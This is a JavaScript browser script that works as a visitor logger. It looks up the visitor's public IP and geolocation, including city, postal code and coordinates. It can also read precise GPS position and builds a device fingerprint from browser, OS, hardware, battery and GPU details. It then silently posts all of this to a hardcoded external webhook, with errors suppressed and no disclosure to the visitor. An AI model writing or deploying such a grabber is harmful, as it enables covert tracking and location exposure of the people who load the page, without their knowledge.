const ENABLE_LOGGING = localStorage.getItem('ENABLE_LOGGING') === 'true';
const USE_GPS = localStorage.getItem('USE_GPS') === 'true';

const ipinfo = {}, gpsinfo = {}, deviceinfo = {};

function gatherIPInfo() {
  return fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(data => {
      const ipv4 = data.ip;
      return fetch(`https://ipapi.co/${ipv4}/json/`);
    })
    .then(res => res.json())
    .then(data => {
      Object.assign(ipinfo, {
        IP: data.ip,
        City: data.city,
        Region: data.region,
        Country: `${data.country_name} (${data.country})`,
        Postal: data.postal,
        Latitude: data.latitude,
        Longitude: data.longitude,
        ISP: data.org,
        ASN: data.asn || "N/A",
        Timezone: data.timezone,
        Currency: `${data.currency} (${data.currency_name})`
      });
    })
    .catch(() => {
      Object.assign(ipinfo, { Error: "Failed to get IP info" });
    });
}

function gatherGPSInfo() {
  return new Promise(resolve => {
    if (!USE_GPS || !navigator.geolocation) {
      Object.assign(gpsinfo, { Location: "GPS disabled" });
      return resolve();
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        Object.assign(gpsinfo, {
          Latitude: pos.coords.latitude.toFixed(6),
          Longitude: pos.coords.longitude.toFixed(6),
          Accuracy: `±${pos.coords.accuracy.toFixed(1)} meters`
        });
        resolve();
      },
      () => {
        Object.assign(gpsinfo, { Location: "Denied or unavailable" });
        resolve();
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
}

function gatherDeviceInfo() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const lang = navigator.language;
  const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
  const tzOffset = new Date().getTimezoneOffset();
  const browserMatch = ua.match(/(Firefox|Chrome|Edg|Safari)\/[\d.]+/) || [];
  const osMatch = ua.match(/\(([^)]+)\)/);
  const now = new Date().toString();

  Object.assign(deviceinfo, {
    Browser: browserMatch[0] || "Unknown",
    OS: osMatch ? osMatch[1] : platform,
    Platform: platform,
    Language: lang,
    LocalTime: now,
    TimezoneOffset: tzOffset + " minutes",
    Resolution: `${screen.width} × ${screen.height}`,
    TouchSupport: ("ontouchstart" in window || navigator.maxTouchPoints > 0) ? "Yes" : "No",
    DoNotTrack: dnt,
    Memory: (navigator.deviceMemory || "Unknown") + " GB",
    CPUThreads: navigator.hardwareConcurrency || "Unknown",
    Plugins: Array.from(navigator.plugins).map(p => p.name).join(", ") || "None"
  });

  const batteryPromise = navigator.getBattery ? navigator.getBattery().then(battery => {
    const status = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : "");
    deviceinfo.Battery = status;
  }).catch(() => {}) : Promise.resolve();

  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    const gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    const gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    deviceinfo.GPU = `${gpuVendor} — ${gpuRenderer}`;
  } catch {
    deviceinfo.GPU = "Unavailable";
  }

  return batteryPromise;
}

async function collectAndSend() {
  if (!ENABLE_LOGGING) return;

  await gatherIPInfo();
  await gatherGPSInfo();
  await gatherDeviceInfo();

  const lines = [];
  lines.push("**🌍 IP Location:**");
  for (let key in ipinfo) lines.push(`**${key}**: ${ipinfo[key]}`);

  if (USE_GPS) {
    lines.push("\n**📡 GPS:**");
    for (let key in gpsinfo) lines.push(`**${key}**: ${gpsinfo[key]}`);
  }

  lines.push("\n**🧠 Device Info:**");
  for (let key in deviceinfo) lines.push(`**${key}**: ${deviceinfo[key]}`);

  const payload = { content: lines.join("\n") };

  fetch("https://01jyms7652807y2mgwsr6x25gq.hooks.webhookrelay.com", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(() => {});
}

if (ENABLE_LOGGING) {
  collectAndSend();
}